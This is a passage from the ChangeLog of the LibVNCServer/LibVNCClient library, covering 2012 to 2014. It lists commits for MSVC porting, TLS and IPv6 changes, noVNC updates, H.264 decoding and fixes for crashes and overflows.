	x11vnc/misc/enhanced_tightvnc_viewer/COPYING,
	x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/README.txt,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/sshvnc.bat,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/tsvnc.bat,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/connect_br.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/esound/downl
	oad.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/openssl/down
	load.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/openssl/loca
	tion.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/plink/downlo
	ad.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/plink/licenc
	e.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/stunnel/down
	load.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/stunnel/loca
	tion.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/vncviewer/do
	wnload.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/vncviewer/lo
	cation.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/stunnel-client.co
	nf,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/stunnel-server.co
	nf,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/w98/location.url,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/Darwin.Power.Macintosh/.cp
	over,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/Darwin.Power.Macintosh/vnc
	viewer.sh,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/Darwin.i386/.cpover,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/sshvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/tsvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/stunnel-server.conf,
	x11vnc/misc/enhanced_tightvnc_viewer/build.unix,
	x11vnc/misc/enhanced_tightvnc_viewer/filelist.txt,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvnc.1,
	x11vnc/misc/enhanced_tightvnc_viewer/man/man1/ssvncviewer.1,
	x11vnc/misc/enhanced_tightvnc_viewer/src/README,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/README,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_getpatches,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_vncpatchapplied,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/stunnel-maxconn.pa
	tch,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	ll.patch,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	llscreen.patch,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-ne
	wfbsize.patch,
	x11vnc/misc/enhanced_tightvnc_viewer/src/zips/README,
	x11vnc/misc/enhanced_tightvnc_viewer/ssvnc.desktop,
	x11vnc/misc/inet6to4, x11vnc/misc/panner.pl,
	x11vnc/misc/qt_tslib_inject.pl, x11vnc/misc/ranfb.pl,
	x11vnc/misc/rx11vnc, x11vnc/misc/rx11vnc.pl, x11vnc/misc/shm_clear,
	x11vnc/misc/slide.pl, x11vnc/misc/turbovnc/Makefile.am,
	x11vnc/misc/turbovnc/README, x11vnc/misc/turbovnc/apply_turbovnc,
	x11vnc/misc/turbovnc/convert,
	x11vnc/misc/turbovnc/convert_rfbserver,
	x11vnc/misc/turbovnc/tight.c, x11vnc/misc/turbovnc/turbojpeg.h,
	x11vnc/misc/turbovnc/undo_turbovnc, x11vnc/misc/uinput.pl,
	x11vnc/misc/ultravnc_repeater.pl, x11vnc/misc/vcinject.pl,
	x11vnc/misc/x11vnc_loop, x11vnc/misc/x11vnc_pw, x11vnc/nox11.h,
	x11vnc/nox11_funcs.h, x11vnc/options.c, x11vnc/options.h,
	x11vnc/params.h, x11vnc/pm.c, x11vnc/pm.h, x11vnc/pointer.c,
	x11vnc/pointer.h, x11vnc/rates.c, x11vnc/rates.h, x11vnc/remote.c,
	x11vnc/remote.h, x11vnc/scan.c, x11vnc/scan.h, x11vnc/screen.c,
	x11vnc/screen.h, x11vnc/scrollevent_t.h, x11vnc/selection.c,
	x11vnc/selection.h, x11vnc/solid.c, x11vnc/solid.h,
	x11vnc/sslcmds.c, x11vnc/sslcmds.h, x11vnc/sslhelper.c,
	x11vnc/sslhelper.h, x11vnc/ssltools.h, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/uinput.c, x11vnc/uinput.h,
	x11vnc/unixpw.c, x11vnc/unixpw.h, x11vnc/user.c, x11vnc/user.h,
	x11vnc/userinput.c, x11vnc/userinput.h, x11vnc/util.c,
	x11vnc/util.h, x11vnc/v4l.c, x11vnc/v4l.h, x11vnc/win_utils.c,
	x11vnc/win_utils.h, x11vnc/winattr_t.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc.desktop, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c, x11vnc/xdamage.c, x11vnc/xdamage.h,
	x11vnc/xevents.c, x11vnc/xevents.h, x11vnc/xinerama.c,
	x11vnc/xinerama.h, x11vnc/xkb_bell.c, x11vnc/xkb_bell.h,
	x11vnc/xrandr.c, x11vnc/xrandr.h, x11vnc/xrecord.c,
	x11vnc/xrecord.h, x11vnc/xwrappers.c, x11vnc/xwrappers.h: Remove
	x11vnc subdir.  The new x11vnc repo is at https://github.com/LibVNC/x11vnc.

2014-09-02  Johannes Schindelin <johannes.schindelin@gmx.de>

	* libvncclient/tls_openssl.c: Fix tv_usec calculation This bug was introduced in the MSVC patches.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-08-29  Daniel Cohen Gindi <danielgindi@gmail.com>

	* libvncclient/tls_openssl.c: Use Windows' critical sections to
	emulate pthread's mutexes With Microsoft Visual C++, we cannot use pthreads (MinGW sports an
	emulation library which is the reason we did not need
	Windows-specific hacks earlier). Happily, it is very easy to provide
	Windows-specific emulations for the pthread calls we use.  [JES: fixed commit message] Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-08-29  Daniel Cohen Gindi <danielgindi@gmail.com>

	* libvncclient/zrle.c: Perform pointer arithmetic on char * instead
	of void * Microsoft Visual C++ does not allow pointer arithmetic on void
	pointers.  [JES: fixed commit message] Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-08-29  Daniel Cohen Gindi <danielgindi@gmail.com>

	* libvncclient/tls_openssl.c, rfb/rfbproto.h: MSVC: Use the Unix
	emulation headers [JES: provided commit message, split out unrelated changes] Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-08-29  Daniel Cohen Gindi <danielgindi@gmail.com>

	* libvncclient/listen.c, libvncclient/sockets.c,
	libvncclient/vncviewer.c: Use WIN32 for Windows-specific #ifdef
	guards To support Microsoft Visual C++, we must not guard Windows-specific
	code in MinGW-specific #ifdef guards.  Happily, even 64-bit MSVC defines the WIN32 constant, therefore we
	can use that instead.  [JES: fixed commit message, reordered commit, split out unrelated
	changes] Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-08-29  Daniel Cohen Gindi <danielgindi@gmail.com>

	* compat/msvc/stdint.h, compat/msvc/sys/time.h,
	compat/msvc/unistd.h: Add MSVC compatible unix headers The stdint.h file was copied from:
	https://runexe.googlecode.com/svn-history/r9/trunk/src/runlib/msstdint.h(we can incorporate it because it is licensed under the 3-clause BSD
	license.) [JES: fixed commit message, fixed stripped copyright header] Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-09-01  Daniel Cohen Gindi <danielgindi@gmail.com>

	* libvncclient/rfbproto.c, libvncclient/sockets.c,
	libvncclient/tls_openssl.c: MSVC: Use _snprintf instead of snprintf In Microsoft's Visual C runtime, the snprintf() function is actually
	called _snprintf. Let's just #define the former to call the latter.  [JES: fixed commit message] Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-09-01  Daniel Cohen Gindi <danielgindi@gmail.com>

	* rfb/rfbproto.h: Use correct winsock header We link to ws2_32.lib which corresponds to the winsock2.h header,
	not the winsock.h header.  [JES: fixed commit message] Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-08-29  Daniel Cohen Gindi <danielgindi@gmail.com>

	* libvncclient/vncviewer.c: Include Winsock2 header before windows.h
	include That's because there are duplicate #defines, and when Winsock2 is
	defined before windows.h then windows.h detects that and prevent
	redefinition.  See

	http://social.msdn.microsoft.com/Forums/windowsdesktop/en-US/4a90b143-1fb8-43e9-a54c-956127e0c579/windowsh-and-winsock2h?forum=windowssdk[JES: fixed commit message] Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-09-01  Daniel Cohen Gindi <danielgindi@gmail.com>

	* libvncclient/tls_openssl.c: Remove unused variables This change is technically not required to support MSVC, but it was
	detected by Microsoft's compiler.  [JES: fixed commit message] Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-08-26  dscho <johannes.schindelin@gmx.de>

	* : Merge pull request #21 from newsoft/master Fixing two more security issues (remote server crash)

2014-08-18  Nicolas Ruff <nruff@google.com>

	* libvncserver/rfbserver.c: Check malloc() return value on
	client->server ClientCutText message. Client can send up to 2**32-1
	bytes of text, and such a large allocation is likely to fail in case
	of high memory pressure. This would in a server crash (write at
	address 0).

2014-08-16  dscho <johannes.schindelin@gmx.de>

	* : Merge pull request #16 from sandsmark/master Merge patches from KDE/krfb

2014-08-16  Johannes Schindelin <johannes.schindelin@gmx.de>

	* acinclude.m4: Fix whitespace Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-08-10  Luca Falavigna <dktrkranz@debian.org>

	* acinclude.m4: Enable support for ppc64el architecture

2014-08-10  Luca Falavigna <dktrkranz@debian.org>

	* libvncclient.pc.in, libvncserver.pc.in: Use Libs.private to avoid
	unnecessary linkage

2014-08-16  Johannes Schindelin <johannes.schindelin@gmx.de>

	* libvncclient/rfbproto.c, libvncclient/vncviewer.c: Fix indentation Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-08-16  dscho <johannes.schindelin@gmx.de>

	* : Merge pull request #20 from newsoft/master Fix integer overflow in MallocFrameBuffer()

2014-08-15  newsoft <newsoft@MacBook-Air-de-newsoft-2.local>

	* libvncclient/vncviewer.c: Fix integer overflow in
	MallocFrameBuffer() Promote integers to uint64_t to avoid integer overflow issue during
	frame buffer allocation for very large screen sizes

2013-09-28  Amandeep Singh <aman.dedman@gmail.com>

	* libvncserver/sockets.c: allow rfbInitSockets with non-ready
	states.  This allows for reinitializations of e. g. sockets in a SHUTDOWN
	state.  The only state that doesn't make sense to reinitialize are
	READY states.

2013-10-09  Amandeep Singh <aman.dedman@gmail.com>

	* libvncserver/main.c: Fix crash in krfb Krfb crashes on quit, if any client is connected due to a
	rfbClientConnectionGone call missing

2014-07-10  Will Thompson <will@willthompson.co.uk>

	* x11vnc/xrandr.c: x11vnc: fix double X_UNLOCK on xrandr events check_xrandr_event() assumes X_LOCK is taken before it is called,
	and currently calls X_UNLOCK on behalf of the caller. But in
	practice, all callers assume that the lock is still held after
	check_xrandr_event() returns. In particular, this leads to a
	double-unlock and crash in check_xevents() on any xrandr event.

2014-07-18  dscho <johannes.schindelin@gmx.de>

	* : Merge pull request #13 from
	wjt/fix-double-X_UNLOCK-on-xrandr-event x11vnc: fix double X_UNLOCK on xrandr events

2014-06-27  Johannes Schindelin <johannes.schindelin@gmx.de>

	* common/lzoconf.h, common/lzodefs.h, common/minilzo.c,
	common/minilzo.h: Update LZO to version 2.07 It was reported that LZO has security issues in LMS-2014-06-16-1:
	Oberhumer LZO (CVE-2014-4607):
	http://seclists.org/oss-sec/2014/q2/665 This was also reported by Alex Xu as
	https://github.com/LibVNC/libvncserver/issues/9.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-06-23  dscho <johannes.schindelin@gmx.de>

	* : Merge pull request #7 from waldheinz/init-sfae-padding Initialize padding in SetFormatAndEncodings' rfbSetPixelFormatMsg.

2014-06-23  Matthias Treydte <mt@waldheinz.de>

	* libvncclient/rfbproto.c: Initialize padding in
	SetFormatAndEncodings' rfbSetPixelFormatMsg.

2014-06-23  Matthias Treydte <mt@waldheinz.de>

	* CMakeLists.txt: Use CMAKE_CURRENT_*_DIR instead of CMAKE_*_DIR.  This makes the library friendly to use as a git submodule within
	another project, and should change nothing when compiled alone.  For example when having a directory structure like
	"my_project/external/libvnc", where in libvnc resides a checkout of
	libvncserver, one can just reference that directory from the
	CMakeLists.txt in my_project with > add_directory ( external/libvnc ) and add vncclient / vncserver in my_project's taret_link_libraries,
	one can just hack away without having to manually make / install
	LibVNCServer whenever something is changed there.

2014-05-14  dscho <johannes.schindelin@gmx.de>

	* : Merge pull request #4 from dextero/master x11vnc: adjust blackout region coordinates to the clipping region

2014-04-05  Johannes Schindelin <johannes.schindelin@gmx.de>

	* libvncclient/rfbproto.c: libvncclient: If we have TLS support,
	enable VeNCrypt by default Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-04-05  Johannes Schindelin <johannes.schindelin@gmx.de>

	* .gitignore: Ignore the 'mac' example, too Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-04-05  Johannes Schindelin <johannes.schindelin@gmx.de>

	* .gitignore: Ignore the vencrypt document         https://www.berrange.com/~dan/vencrypt.txt Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-04-05  Johannes Schindelin <johannes.schindelin@gmx.de>

	* .gitignore: Ignore rfbproto.rst A more up-to-date version of the RFB protocol is maintained by
	TigerVNC:
	http://sourceforge.net/p/tigervnc/code/HEAD/tree/rfbproto/rfbproto.rstSigned-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-03-29  Johannes Schindelin <johannes.schindelin@gmx.de>

	* examples/repeater.c: Repeater example: show how to shut down
	cleanly Since we connected to the client through the repeater, chances are
	that we want this server shut down once the client disconnected.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-03-29  Johannes Schindelin <johannes.schindelin@gmx.de>

	* .gitignore, examples/Makefile.am, examples/repeater.c: Add an
	example how to connect to an UltraVNC-style repeater UltraVNC offers an add-on to connect clients and servers via IDs
	with a so-called repeater (e.g. to bridge firewalled clients and
	servers):         http://www.uvnc.com/products/uvnc-repeater.html This example demonstrates how to use that feature with a
	LibVNCServer-based server.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-04-05  Christian Beier <dontmind@freeshell.org>

	* configure.ac, webclients/novnc/README.md,
	webclients/novnc/vnc.html: Update sourceforge links to point to
	github.

2014-03-31  Johannes Schindelin <johannes.schindelin@gmx.de>

	* libvncserver/rfbregion.c: Fix tyop Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-03-30  Johannes Schindelin <johannes.schindelin@gmx.de>

	* .gitignore: Ignore more generated files While at it, also ignore the documentation of the RFB protocol best
	downloaded manually from         http://www.realvnc.com/docs/rfbproto.pdf Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-03-30  Robbert Klarenbeek <robbertkl@users.sourceforge.net>

	* libvncclient/vncviewer.c: Address #12 ClientData does not get
	freed rfbClientSetClientData() allocates a new rfbClientData, but never
	gets cleaned up, which causes memory leaks.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2014-03-30  Johannes Schindelin <johannes.schindelin@gmx.de>

	* examples/example.c, test/encodingstest.c: After free()ing
	clientData, set it to NULL We will change rfbClientCleanup() to free the data.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2013-02-27  Joel Martin <github@martintribe.org>

	* libvncserver/websockets.c: Set opcode correctly for binary frames.

2013-01-25  Christian Beier <dontmind@freeshell.org>

	* rfb/rfbproto.h: Remove unneeded #ifdefs.

2013-01-25  Christian Beier <dontmind@freeshell.org>

	* rfb/rfbclient.h: Fix ABI compatibility issue.

2013-01-09  David Verbeiren <david.verbeiren@intel.com>

	* client_examples/gtkvncviewer.c, configure.ac,
	libvncclient/Makefile.am, libvncclient/h264.c,
	libvncclient/rfbproto.c, libvncclient/vncviewer.c, rfb/rfbclient.h,
	rfb/rfbproto.h: LibVNCClient: Add H.264 encoding for framebuffer
	updates This patch implements support in LibVNCClient for framebuffer
	updates encoded as H.264 frames. Hardware accelerated decoding is
	performed using VA API.  This is experimental support to let the community explore the
	possibilities offered by the potential bandwidth and latency
	reductions that H.264 encoding allows. This may be particularly
	useful for use cases such as online gaming, hosted desktops, hosted
	set top boxes...  This patch only provides the client side support and is meant to be
	used with corresponding server-side support, as provided by an
	upcoming patch for qemu ui/vnc module (to view the display of a
	virtual machine executing under QEMU).  With this H.264-based encoding, if multiple framebuffer update
	messages are generated for a single server framebuffer modification,
	the H.264 frame data is sent only with the first update message.
	Subsequent update framebuffer messages will contain only the
	coordinates and size of the additional updated regions.  Instructions/Requirements: * The patch should be applied on top of the previous patch I
	submitted with minor enhancements to the gtkvncviewer application:
	http://sourceforge.net/mailarchive/message.php?msg_id=30323804 * Currently only works with libva 1.0: use branch "v1.0-branch" for
	libva and intel-driver. Those can be built as follows:    cd libva    git checkout v1.0-branch    ./autogen.sh    make    sudo make install    cd ..     git clone git://anongit.freedesktop.org/vaapi/intel-driver    cd intel-driver    git checkout v1.0-branch    ./autogen.sh    make    sudo make install Signed-off-by: David Verbeiren <david.verbeiren@intel.com>

2013-01-08  David Verbeiren <david.verbeiren@intel.com>

	* client_examples/gtkvncviewer.c: gtkvncviewer enhancements Hide "Connecting" dialog in gtkvncviewer once an update is received.  Hide local cusror in gtkvncviewer.

2012-09-14  Christian Beier <dontmind@freeshell.org>

	* AUTHORS: Add Raphael to AUTHORS.

2012-09-11  Raphael Kubo da Costa <rakuco@FreeBSD.org>

	* libvncclient/rfbproto.c: Include strings.h for strncasecmp(3)

2012-09-11  Raphael Kubo da Costa <rakuco@FreeBSD.org>

	* libvncserver/websockets.c: Work around a gcc bug with anonymous
	structs and unions.  GCC < 4.6 failed to parse the declaration of ws_header_t correctly
	because it did not accept anonymous structs and unions. [1] Work around the bug by adding names to the unions and structs. Ugly,
	but works.  [1] http://gcc.gnu.org/bugzilla/show_bug.cgi?id=4784

2012-09-11  Raphael Kubo da Costa <rakuco@FreeBSD.org>

	* libvncserver/rfbserver.c: Include stdio.h for snprintf(3)

2012-09-11  Raphael Kubo da Costa <rakuco@FreeBSD.org>

	* libvncserver/websockets.c: Add the required headers for read(2)

2012-09-11  Raphael Kubo da Costa <rakuco@FreeBSD.org>

	* CMakeLists.txt, configure.ac, libvncserver/websockets.c,
	rfb/rfbconfig.h.cmake: Use htobeNN(3) to convert numbers in
	websocket.c.  byteswap.h exists only on glibc, so building libvncserver with
	websockets support was not possible in other systems.  Replace the inclusion of byteswap.h and the WS_* definitions with
	calls to htobeNN, which should perform the same conversions, be more
	portable and avoid the need to check for the platform's endianness.

2012-09-11  Raphael Kubo da Costa <rakuco@FreeBSD.org>

	* CMakeLists.txt, configure.ac: Do not hardcode the need for
	libresolv.  libresolv is only present on systems which use glibc; platforms such
	as FreeBSD have __b64_ntop as part of libc itself.  Improve the detection process and only link against libresolv if it
	exists on the system, and remember to reset CMAKE_REQUIRED_LIBRARIES
	after performing the necessary tests, since we do not always want to
	link against libresolv.

2012-09-11  Raphael Kubo da Costa <rakuco@FreeBSD.org>

	* common/vncauth.c, libvncclient/rfbproto.c,
	libvncclient/sockets.c, libvncserver/httpd.c,
	libvncserver/rfbserver.c, libvncserver/sockets.c,
	libvncserver/websockets.c: Tune the definitions needed when building
	with -ansi.  The current definitions were mostly useful to glibc and followed its
	feature_test_macros(3) documentation.  However, this means other platforms still had problems when building
	with strict compilation flags. _BSD_SOURCE, for example, is only
	recognized by glibc, and other platforms sometimes need
	_XOPEN_SOURCE instead, or even the removal of some definitions (such
	as the outdate _POSIX_SOURCE one).  _POSIX_SOURCE also had to be conditionally defined in some places,
	as what it enables or disables during compilation varies across
	systems.

2012-09-11  Raphael Kubo da Costa <rakuco@FreeBSD.org>

	* libvncserver/sockets.c, libvncserver/websockets.c: Add some
	missing feature macro definitions.  Building with -ansi failed due to some code (as well as system
	headers) using non-C89 features. Fix that by adding the usual
	_POSIX_SOURCE and _BSD_SOURCE definitions already present in some
	other files.

2012-09-11  Raphael Kubo da Costa <rakuco@FreeBSD.org>

	* common/turbojpeg.c, libvncserver/tight.c,
	libvncserver/websockets.c, rfb/rfb.h, rfb/rfbconfig.h.cmake,
	test/bmp.h: Use C-style comments in rfbconfig.h.cmake and C source
	code.  Using C++-style comments when building the code with -ansi does not
	work, so be more conservative with the comment style.

2012-09-11  Raphael Kubo da Costa <rakuco@FreeBSD.org>

	* libvncserver/websockets.c: Correctly include rfbconfig.h.  build_dir/rfb is not passed as an include directory automatically to
	the compiler, so including that file fails.

2012-09-11  Raphael Kubo da Costa <rakuco@FreeBSD.org>

	* CMakeLists.txt: CMake: Link against libgcrypt when it is found.  So far, libgcrypt was looked for but no targets linked against it
	directly; this caused linking problems for the client and server
	examples, as the symbols they needed were not passed to the linker.  The issue that the GnuTLS websockets code uses libgcrypt regardless
	of whether it has been found or not has not been touched by this
	commit, though.

2012-08-19  Christian Beier <dontmind@freeshell.org>

	* webclients/novnc/LICENSE.txt, webclients/novnc/README.md,
	webclients/novnc/include/base.css,
	webclients/novnc/include/black.css,
	webclients/novnc/include/blue.css,
	webclients/novnc/include/display.js,
	webclients/novnc/include/input.js,
	webclients/novnc/include/playback.js,
	webclients/novnc/include/rfb.js, webclients/novnc/include/ui.js,
	webclients/novnc/include/util.js, webclients/novnc/include/vnc.js,
	webclients/novnc/include/web-socket-js/web_socket.js,
	webclients/novnc/include/websock.js,
	webclients/novnc/include/webutil.js, webclients/novnc/vnc.html,
	webclients/novnc/vnc_auto.html: Update noVNC webclient.

2012-08-19  Christian Beier <dontmind@freeshell.org>

	* AUTHORS: Update AUTHORS.

2012-08-08  Oliver Loch <o.loch@gmx.net>

	* libvncserver/sockets.c: Patched sockets.c to allow the use of IPv6
	without IPv4.  As requested only those lines are indented that have been changed.

2012-07-20  Johannes Schindelin <johannes.schindelin@gmx.de>

	* AUTHORS: Add another contributor Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2012-07-19  Rostislav Lisovy <lisovy@gmail.com>

	* libvncclient/tls_openssl.c: Fix in milliseconds to struct timeval
	conversion Signed-off-by: Rostislav Lisovy <lisovy@gmail.com> Signed-off-by:
	Johannes Schindelin <johannes.schindelin@gmx.de>

2012-05-31  Christian Beier <dontmind@freeshell.org>

	* libvncserver/config.h, libvncserver/rfbconfig.h: Remove
	autogenerated files from repo.

2012-05-23  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, configure.ac, rfb/rfbconfig.h.cmake: Add Compile
	Time Version Test Defines.

2012-05-18  Kyle J. McKay <mackyle@gmail.com>

	* libvncserver/sockets.c: libvncserver/sockets.c: do not segfault
	when listenSock/listen6Sock == -1

2012-05-09  Christian Beier <dontmind@freeshell.org>

	* TODO, libvncclient/rfbproto.c, libvncclient/sockets.c,
	vncterm/LinuxVNC.c: Fix some compiler warnings that hinted some no
	too unimportant errors.

2012-05-07  Christian Beier <dontmind@freeshell.org>

	* TODO: Update TODO.

2012-05-07  Luca Falavigna <dktrkranz@debian.org>

	* test/encodingstest.c: Encodingstest: Use format string argument
	with fprintf.

2012-05-05  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, configure.ac: Bump version to 0.9.10.

2012-05-04  Christian Beier <dontmind@freeshell.org>

	* ChangeLog: Update ChangeLog for 0.9.9.

2012-05-04  Christian Beier <dontmind@freeshell.org>

	* configure.ac: Enable building DLLs with MinGW32.

2012-05-04  Christian Beier <dontmind@freeshell.org>

	* NEWS: Update NEWS for 0.9.9.

2012-05-03  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c: LibVNCClient: #undef these types in case
	it's WIN32.  The various other headers include windows.h and the winsock headers
	which give an error when SOCKET and socklen_t are already defined.

2012-05-03  Christian Beier <dontmind@freeshell.org>

	* rfb/rfb.h: LibVNCServer: Include ws2tcpip.h if it's available.  Needed for the IPv6 stuff.

2012-04-30  Christian Beier <dontmind@freeshell.org>

	* libvncserver/Makefile.am: LibVNCServer: Prefer GnuTLS over OpenSSL
	to be in sync with LibVNCClient.

2012-04-30  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbserver.c: Some more libjpeg, libpng and zlib
	related build fixes.

2012-04-30  Christian Beier <dontmind@freeshell.org>

	* configure.ac: Make PKG_CHECK_MODULES fail non-fatal.  These check for optional modules.

2012-04-30  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbserver.c, rfb/rfb.h: Only try to build TightPNG
	stuff when libjpeg is available.  TightPNG replaces the ZLIB stuff int Tight encoding with PNG. It
	still uses JPEG rects as well. Theoretically, we could build
	TightPNG with only libpng and libjpeg - without zlib - but libpng
	depends on zlib, so this is kinda moot.

2012-04-27  Christian Beier <dontmind@freeshell.org>

	* test/Makefile.am: Only build libjpeg test programs if libjpeg is
	actually available.

2012-04-26  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: Fix CMake build of LibVNCClient.

2012-04-26  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbserver.c: Properly check return value.  This also fixes a compiler warning.

2012-04-26  Christian Beier <dontmind@freeshell.org>

	* configure.ac: Fix build when no libjpeg is available.

2012-04-26  Christian Beier <dontmind@freeshell.org>

	* examples/android/Makefile.am, libvncserver/Makefile.am: Include
	some more missing files for make dist.

2012-04-25  Christian Beier <dontmind@freeshell.org>

	* libvncserver/Makefile.am: Include missing files for make dist.

2012-04-25  Christian Beier <dontmind@freeshell.org>

	* libvncclient/Makefile.am: Fix libvncclient make dist.

2012-04-25  Christian Beier <dontmind@freeshell.org>

	* configure.ac: Better check for Linux build.

2012-04-25  Christian Beier <dontmind@freeshell.org>

	* vncterm/Makefile.am: Binaries that are to be installed should be
	all lowercase.

2012-04-25  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, configure.ac: Bump version to 0.9.9.

2012-04-25  Christian Beier <dontmind@freeshell.org>

	* common/turbojpeg.c, libvncserver/rfbserver.c,
	libvncserver/websockets.c, test/tjbench.c: Fix some compiler
	warnings thrown with newer gcc.

2012-04-25  Christian Beier <dontmind@freeshell.org>

	* test/Makefile.am: Fix turbojpeg tests compilation.

2012-04-25  DRC <information@virtualgl.org>

	* common/turbojpeg.c: Fix compilation with some libjpeg
	distributions.

2012-04-22  Monkey <chris.boyle.1978@gmail.com>

	* libvncclient/rfbproto.c: Added support for UltraVNC Single Click
	as originally proposed by Noobius (Boobius) on 6/1/11.  Original thread:

	http://sourceforge.net/tracker/?func=detail&aid=3310255&group_id=32584&atid=405860

2012-04-15  Christian Beier <dontmind@freeshell.org>

	* AUTHORS: Add Philip to AUTHORS.

2012-04-15  Christian Beier <dontmind@freeshell.org>

	* libvncclient/tls_none.c: LibVNCClient: Fix build with no SSL/TLS
	library available.

2012-04-15  Christian Beier <dontmind@freeshell.org>

	* libvncclient/tls_openssl.c: LibVNCClient: properly free the
	openssl session stuff on shutdown.

2012-04-15  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c, libvncclient/sockets.c,
	libvncclient/tls_gnutls.c, libvncclient/vncviewer.c,
	rfb/rfbclient.h: LibVNCClient: Remove all those WITH_CLIENT_TLS
	#ifdefs and move GnuTLS specific functionality into tls_gnutls.c.

2012-04-14  Christian Beier <dontmind@freeshell.org>

	* configure.ac: Unify GnuTLS vs OpenSSL build systems stuff between
	libvncclient and libvncserver.

2012-04-14  Christian Beier <dontmind@freeshell.org>

	* libvncclient/Makefile.am, libvncclient/{tls.c => tls_gnutls.c},
	libvncclient/tls_none.c, libvncclient/tls_openssl.c: Add the OpenSSL
	libvncclient TLS version to the build system.

2012-04-12  Christian Beier <dontmind@freeshell.org>

	* webclients/novnc/LICENSE.txt, webclients/novnc/README.md,
	webclients/novnc/include/base.css,
	webclients/novnc/include/base64.js,
	webclients/novnc/include/display.js,
	webclients/novnc/include/input.js,
	webclients/novnc/include/jsunzip.js,
	webclients/novnc/include/rfb.js, webclients/novnc/include/ui.js,
	webclients/novnc/include/util.js, webclients/novnc/include/vnc.js,
	webclients/novnc/include/websock.js,
	webclients/novnc/include/webutil.js, webclients/novnc/vnc.html,
	webclients/novnc/vnc_auto.html: Update our copy of noVNC.  Bugfixes and support for tight encoding with zlib.

2012-04-12  Christian Beier <dontmind@freeshell.org>

	* libvncserver/tight.c: Make TurboVNC compress level 3 actually
	work.

2012-04-09  DRC <information@virtualgl.org>

	* common/turbojpeg.c: Fix memory leak in TurboVNC Note that the memory leak was only occurring with the colorspace
	emulation code, which is only active when using regular libjpeg (not
	libjpeg-turbo.) Diagnosed by Christian Beier, using valgrind.  Signed-off-by: Johannes Schindelin <johannes.schindelin@gmx.de>

2012-04-02  Christian Beier <dontmind@freeshell.org>

	* libvncclient/listen.c, libvncclient/sockets.c,
	libvncserver/httpd.c, libvncserver/sockets.c: IPv6 support for
